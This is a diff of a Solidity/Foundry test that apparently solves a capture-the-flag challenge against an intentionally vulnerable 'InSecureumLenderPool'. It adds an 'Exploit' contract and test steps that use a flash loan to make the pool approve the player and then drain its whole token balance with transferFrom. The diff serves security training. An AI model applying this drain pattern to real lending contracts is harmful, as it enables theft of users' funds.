@@ -4,6 +4,8 @@ pragma solidity ^0.8.13;
 import "forge-std/Test.sol";
 import "forge-std/console2.sol";
 import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import {Address} from "@openzeppelin/contracts/utils/Address.sol";
+import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
 
 import {InSecureumLenderPool} from "../src/Challenge1.lenderpool.sol";
 import {InSecureumToken} from "../src/tokens/tokenInsecureum.sol";
@@ -25,26 +27,26 @@ contract Challenge1Test is Test {
         vm.label(address(token), "InSecureumToken");
     }
 
-    function testChallenge() public {        
+    function testChallenge1() public {        
         vm.startPrank(player);
 
         /*//////////////////////////////
         //    Add your hack below!    //
         //////////////////////////////*/
 
-        //=== this is a sample of flash loan usage
         FlashLoandReceiverSample _flashLoanReceiver = new FlashLoandReceiverSample();
-
+        
+        Exploit exploit = new Exploit();
+        
         target.flashLoan(
-          address(_flashLoanReceiver),
-          abi.encodeWithSignature(
-            "receiveFlashLoan(address)", player
-          )
+            address(exploit),
+            abi.encodeWithSignature("Hack(address)", player)
         );
-        //===
 
-        //============================//
+        uint256 balance = token.balanceOf(address(target));
 
+        token.transferFrom(address(target), player, balance);
+        
         vm.stopPrank();
 
         assertEq(token.balanceOf(address(target)), 0, "contract must be empty");
@@ -76,4 +78,19 @@ contract FlashLoandReceiverSample {
 
 // @dev this is the solution
 contract Exploit {
+    using Address for address;
+    using SafeERC20 for IERC20;
+
+    /// @dev Token contract address to be used for lending.
+    //IERC20 immutable public token;
+    IERC20 public token;
+    /// @dev Internal balances of the pool for each user.
+    mapping(address => uint) public balances;
+
+    // flag to notice contract is on a flashloan
+    bool private _flashLoan;
+
+    function Hack(address player) public {
+        token.approve(player, token.balanceOf(address(this)));
+    }
 }
